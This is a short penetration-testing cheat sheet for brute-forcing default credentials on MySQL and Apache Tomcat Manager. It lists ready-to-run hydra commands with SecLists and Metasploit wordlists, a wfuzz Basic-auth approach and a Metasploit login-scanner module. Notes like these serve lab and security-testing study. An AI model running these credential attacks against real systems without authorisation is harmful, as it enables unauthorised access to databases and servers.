# brute force default credentials

## mysql
```bash
hydra $IP mysql -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt -t 1
```

## tomcat

colon separated: /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt $IP http-get /manager/html
```

try more than just the default colon separated default creds from seclists.
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt http-get://$IP/manager/html
```

### wfuzz
header `Authorization: Basic FUZZ`
/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist_base64encoded.txt

### metasploit
auxiliary/scanner/http/tomcat_mgr_login
